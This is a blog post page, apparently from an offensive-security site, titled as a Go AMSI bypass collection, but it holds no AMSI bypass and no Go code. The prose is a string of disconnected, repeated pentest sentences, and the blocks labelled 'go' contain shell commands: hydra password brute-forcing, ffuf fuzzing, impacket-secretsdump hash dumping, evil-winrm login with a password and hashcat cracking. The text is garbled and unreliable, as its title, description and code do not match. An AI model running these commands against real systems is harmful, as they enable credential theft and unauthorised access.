---
TitleSEO: "AMSI Bypass Collection in Go | ZureFX"
TitlePost: "AMSI Bypass Collection — Go"
Author: "ZureFX"
Description: "A Go script for amsi bypass collection. Built for security research and automation."
Keywords: "rust, bash, script, powershell, go"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-470.html"
URL_IMAGES: ""
Date: "2024-05-07"
Tags: "Rust, Bash, Script, PowerShell, Go"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-470"
Permalink: "/scripting/script-amsi-bypass-collection-470.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `sqlmap`
- `evil-winrm`
- `john`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.61.81.7 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.133.112/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.12.81.26
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.59.132.161 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.225.152 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 21.92s
```
